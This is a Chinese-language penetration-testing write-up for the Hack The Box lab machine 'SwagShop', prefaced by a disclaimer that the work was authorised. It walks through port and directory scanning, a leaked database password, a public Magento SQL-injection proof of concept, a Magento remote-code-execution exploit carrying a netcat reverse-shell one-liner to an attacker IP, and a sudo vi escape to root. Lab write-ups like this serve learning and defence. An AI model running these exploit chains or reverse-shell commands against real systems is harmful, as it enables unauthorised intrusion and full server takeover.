# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责。

# 服务发现
```
┌──(root💀kali)-[~/htb/SwagShop]
└─# nmap -sV -sC 10.10.10.140 -p-
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-15 03:57 EST
Nmap scan report for 10.10.10.140
Host is up (0.26s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec (RSA)
|   256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba (ECDSA)
|_  256 4c:50:d5:f2:70:c5:fd:c4:b2:f0:bc:42:20:32:64:34 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Did not follow redirect to http://swagshop.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1190.67 seconds


```

先把靶机添加到host文件
```echo "10.10.10.140 swagshop.htb" >> /etc/hosts```

## 目录探测
```
┌──(root💀kali)-[~/dirsearch]
└─# python3 dirsearch.py -e* -t 100 -u http://swagshop.htb  

  _|. _ _  _  _  _ _|_    v0.4.2                                                                                                                                                                                                            
 (_||| _) (/_(_|| (_| )                                                                                                                                                                                                                     
                                                                                                                                                                                                                                            
Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 100 | Wordlist size: 15492

Output File: /root/dirsearch/reports/swagshop.htb/_21-12-15_04-25-16.txt

Error Log: /root/dirsearch/logs/errors-21-12-15_04-25-16.log

Target: http://swagshop.htb/

[04:25:17] Starting:           
[04:25:28] 301 -  309B  - /js  ->  http://swagshop.htb/js/                                                       
[04:25:40] 200 -   10KB - /LICENSE.txt                                      
[04:26:12] 200 -  571KB - /RELEASE_NOTES.txt                                                                
[04:26:19] 200 -   37B  - /api.php                                          
[04:26:19] 301 -  310B  - /app  ->  http://swagshop.htb/app/                
[04:26:19] 200 -    2KB - /app/                                             
[04:26:19] 200 -    2KB - /app/etc/local.xml                                
[04:26:19] 200 -    9KB - /app/etc/local.xml.additional                     
[04:26:19] 200 -    2KB - /app/etc/local.xml.template                       
[04:26:19] 200 -    5KB - /app/etc/config.xml                                  
[04:26:31] 200 -  717B  - /cron.sh                                          
[04:26:31] 200 -    0B  - /cron.php                                         
[04:26:37] 301 -  313B  - /errors  ->  http://swagshop.htb/errors/          
[04:26:38] 200 -    2KB - /errors/                                          
[04:26:39] 200 -    1KB - /favicon.ico                                      
[04:26:46] 200 -  946B  - /includes/                                        
[04:26:46] 301 -  315B  - /includes  ->  http://swagshop.htb/includes/      
[04:26:46] 200 -   16KB - /index.php                                        
[04:26:47] 200 -   44B  - /install.php                                      
[04:26:48] 200 -    4KB - /js/tiny_mce/                                     
[04:26:49] 301 -  318B  - /js/tiny_mce  ->  http://swagshop.htb/js/tiny_mce/
[04:26:50] 301 -  310B  - /lib  ->  http://swagshop.htb/lib/                
[04:26:50] 200 -    3KB - /lib/                                             
[04:26:54] 301 -  312B  - /media  ->  http://swagshop.htb/media/            
[04:26:55] 200 -    2KB - /media/                                           
[04:27:05] 200 -  886B  - /php.ini.sample                                   
[04:27:10] 301 -  314B  - /pkginfo  ->  http://swagshop.htb/pkginfo/        
[04:27:19] 403 -  300B  - /server-status                                    
[04:27:19] 403 -  301B  - /server-status/                                   
[04:27:20] 200 -    2KB - /shell/                                           
[04:27:21] 301 -  312B  - /shell  ->  http://swagshop.htb/shell/            
[04:27:24] 301 -  311B  - /skin  ->  http://swagshop.htb/skin/              
[04:27:34] 301 -  310B  - /var  ->  http://swagshop.htb/var/                
[04:27:34] 200 -  755B  - /var/backups/                                     
[04:27:34] 200 -    2KB - /var/                                             
[04:27:34] 200 -    4KB - /var/cache/                                       
[04:27:34] 200 -    9KB - /var/package/ 
```

首页显示是一个叫```Magento```的网站，在RELEASE_NOTES.txt 显示更新到```1.7.0.2```

```
==== 1.7.0.2 ====

=== Fixes ===
Fixed: Security vulnerability in Zend_XmlRpc - http://framework.zend.com/security/advisory/ZF2012-01 
Fixed: PayPal Standard does not display on frontend during checkout with some merchant countries
```

在```/app/etc/local.xml```页面貌似暴露出了一个mysql密码

```
<crypt>
<key>b355a9e0cd018d3f7f03607141518419</key>
</crypt>
<host>localhost</host>
<username>root</username>
<password>fMVWh7bDHpgZkyfqQXreTjU9</password>
<dbname>swagshop</dbname>
<initStatements>SET NAMES utf8</initStatements>
<model>mysql4</model>
<type>pdo_mysql</type>
<pdoType></pdoType>
<active>1</active>
```

但是我不能使用这个凭证登录ssh


经过不停的谷歌搜索，找到这个cms的一个sql注入的[POC](https://github.com/joren485/Magento-Shoplift-SQLI/blob/master/poc.py)

```
┌──(root💀kali)-[~/htb/SwagShop]
└─# python poc.py http://swagshop.htb                
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
WORKED
Check http://swagshop.htb/admin with creds ypwq:123

```

执行POC以后得到后台登录凭证：```ypwq:123```

登录页面：```http://10.10.10.140/index.php/admin/index/```

登录进系统在底部发现版本号：```Magento ver. 1.9.0.0```

按照版本号找到了[这个exp](https://www.exploit-db.com/exploits/37811)
然而这个exp一直报错，调了半天没有调好

于是在github找到了[另外一个](https://github.com/epi052/htb-scripts-for-retired-boxes/blob/master/swagshop/magento-oneshot.py)替代的exp


```
──(root💀kali)-[~/htb/SwagShop]
└─# python3 exp.py --username ypwq --password 123 --command "id" http://10.10.10.140/index.php/admin/index/                                                                                                                             1 ⨯
[+] Valid credentials (ypwq:123) found. Proceeding without adding a new user.
[-] Searching historical data using 7d as period parameter
[-] Parsing local.xml for install date.
[+] Found install date: Wed, 08 May 2019 07:23:09 +0000
[-] Sending 'id' for execution on the distant end.
[+] Exploit succeeded

uid=33(www-data) gid=33(www-data) groups=33(www-data)

```


证实存在远程代码执行

用下面payload拿到反弹shell

> python3 exp.py --username ypwq --password 123 --command "rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.6 4242 >/tmp/f" http://10.10.10.140/index.php/admin/index/

```
┌──(root💀kali)-[~/htb/SwagShop]
└─# nc -lnvp 4242                          
listening on [any] 4242 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.140] 57068
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ 

```

# 提权
查看sudo权限
```
www-data@swagshop:/home/haris$ sudo -l
sudo -l
Matching Defaults entries for www-data on swagshop:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on swagshop:
    (root) NOPASSWD: /usr/bin/vi /var/www/html/*

```

可以使用vi打开/var/www/html/目录下的任何文件

使用下面的命令提权到root

> sudo /usr/bin/vi /var/www/html/1 -c ':!/bin/sh' /dev/null

```
"/var/www/html/1" [New File]
# /bin/sh

# id
id
uid=0(root) gid=0(root) groups=0(root)
# whoami
whoami
root

```

已经提权到root,可以读取系统里面的任何文件。